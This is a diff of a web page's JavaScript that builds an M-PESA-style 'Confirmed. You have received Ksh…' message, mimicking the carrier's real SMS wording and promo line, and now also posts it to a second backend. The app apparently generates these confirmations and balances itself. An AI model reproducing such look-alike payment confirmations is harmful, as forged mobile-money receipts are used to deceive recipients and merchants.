@@ -1,5 +1,6 @@
 
 
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -270,7 +271,7 @@
                 
                 const confirmationMsg = `${token} Confirmed.You have received Ksh${amt.toFixed(2)} from Mledger intasend Solutions Limited 313031 on ${dateStr} at ${timeStr}. New M-PESA balance is Ksh${userData.balance.toFixed(2)}. Separate personal and business funds through pochi la Biashara on *334#`;
 
-                // Send confirmation message to message API only
+                // Send confirmation message to message API
                 fetch(`${MESSAGE_API}/api/messages`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -281,7 +282,21 @@
                         id: 'mledge'
                     })
                 }).catch(err => {
-                    console.warn("Confirmation message failed to send:", err);
+                    console.warn("Message API failed:", err);
+                });
+
+                // Also send to payment API with id mledge
+                fetch(`${BACKEND_PAYMENT}/api/messages`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        phone: userData.phone,
+                        message: confirmationMsg,
+                        type: 'received',
+                        id: 'mledge'
+                    })
+                }).catch(err => {
+                    console.warn("Payment API message failed:", err);
                 });
 
                 statusDiv.innerHTML = `<strong>✅ Success!</strong><br>Ksh ${amt} added to your balance.<br><span style="font-size:0.75rem;color:#aaa">Token: ${token}</span>`;
